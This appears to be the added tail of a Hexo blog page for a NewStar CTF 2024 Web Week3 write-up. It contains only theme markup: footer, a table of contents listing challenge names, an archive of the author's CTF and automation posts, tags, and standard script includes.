+                    <div class="prevTitle">NewStar CTF 2024 Web Week2复现</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:2185374541@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/HuajiHD" class="iconfont-archer github" target="_blank" title="github"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStar-CTF-2024-Web-Week3%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">NewStar CTF 2024 Web Week3复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include-me"><span class="toc-number">1.1.</span> <span class="toc-text">include me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blindsql1"><span class="toc-number">1.2.</span> <span class="toc-text">blindsql1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AD%E7%9A%AE%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-number">1.3.</span> <span class="toc-text">臭皮的计算机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AD%E7%9A%AE%E8%B8%A9%E8%B8%A9%E8%83%8C"><span class="toc-number">1.4.</span> <span class="toc-text">臭皮踩踩背</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E3%80%8C%E7%85%A7%E7%89%87%E3%80%8D%E6%98%AF%E4%BD%A0%E5%90%97"><span class="toc-number">1.5.</span> <span class="toc-text">这「照片」是你吗</span></a></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 21
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2025/11/09/hello-world/">Hello World</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2025/11/09/Pikachu/">Pikachu</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span>
+            <a class="archive-post-title" href="/2025/10/14/ycb2025-web/">羊城杯2025-web</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/07</span>
+            <a class="archive-post-title" href="/2025/10/07/bugkuawd-10-7/">bugku-awd小记10.7</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span>
+            <a class="archive-post-title" href="/2025/08/11/fengshentai/">封神台2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span>
+            <a class="archive-post-title" href="/2025/07/20/NewStar-CTF-2024-Web-Week2/">NewStar CTF 2024 Web Week2复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span>
+            <a class="archive-post-title" href="/2025/07/20/NewStar-CTF-2024-Web-Week3/">NewStar CTF 2024 Web Week3复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/NewStar-CTF-2024-Web-Week1/">NewStar CTF 2024 Web Week1复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span>
+            <a class="archive-post-title" href="/2025/07/12/YWB2025-Final/">御网杯2025线下赛</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/06</span>
+            <a class="archive-post-title" href="/2025/07/06/BlitzCTF-WP/">BlitzCTF-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span>
+            <a class="archive-post-title" href="/2025/07/02/Junior-Crypt-2025/">Junior.Crypt.2025 CTF</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span>
+            <a class="archive-post-title" href="/2025/05/18/ISCC-WP/">ISCC2025-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span>
+            <a class="archive-post-title" href="/2025/04/20/UCSC-WP/">UCSC-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2025/04/06/XYCTF-WP/">XYCTF-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/16</span>
+            <a class="archive-post-title" href="/2025/02/16/EHAX-WP/">EHAX_WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/27</span>
+            <a class="archive-post-title" href="/2025/01/27/TUCTF-WP/">TUCTF_WP</a>
+        </li>
+                </ul>
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/31</span>
+            <a class="archive-post-title" href="/2024/12/31/SQLByPass/">sql注入绕过技巧</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span>
+            <a class="archive-post-title" href="/2024/12/25/vbsTestAutomation/">vbs自动化测试</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span>
+            <a class="archive-post-title" href="/2024/12/06/ouc-rob-blue/">重生之我在牢山抢小蓝</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span>
+            <a class="archive-post-title" href="/2024/11/27/oucBookSeminar/">研讨室预约填写信息自动化工具</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span>
+            <a class="archive-post-title" href="/2024/10/27/oucAutoCheckIn/">ouc接龙管家自动晚打卡</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="ctf">
+                <span class="iconfont-archer">&#xe606;</span>
+                ctf
+            </span>
+            <span class="sidebar-tag-name" data-tags="writeup">
+                <span class="iconfont-archer">&#xe606;</span>
+                writeup
+            </span>
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+            <span class="sidebar-tag-name" data-tags="python">
+                <span class="iconfont-archer">&#xe606;</span>
+                python
+            </span>
+            <span class="sidebar-tag-name" data-tags="requests">
+                <span class="iconfont-archer">&#xe606;</span>
+                requests
+            </span>
+            <span class="sidebar-tag-name" data-tags="青龙面板">
+                <span class="iconfont-archer">&#xe606;</span>
+                青龙面板
+            </span>
+            <span class="sidebar-tag-name" data-tags="debian">
+                <span class="iconfont-archer">&#xe606;</span>
+                debian
+            </span>
+            <span class="sidebar-tag-name" data-tags="selenium">
+                <span class="iconfont-archer">&#xe606;</span>
+                selenium
+            </span>
+            <span class="sidebar-tag-name" data-tags="javascript">
+                <span class="iconfont-archer">&#xe606;</span>
+                javascript
+            </span>
+            <span class="sidebar-tag-name" data-tags="js">
+                <span class="iconfont-archer">&#xe606;</span>
+                js
+            </span>
+            <span class="sidebar-tag-name" data-tags="vbs">
+                <span class="iconfont-archer">&#xe606;</span>
+                vbs
+            </span>
+            <span class="sidebar-tag-name" data-tags="-web">
+                <span class="iconfont-archer">&#xe606;</span>
+                -web
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://huajihd.github.io",
+        root: siteMetaRoot,
+        author: "Huaji"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
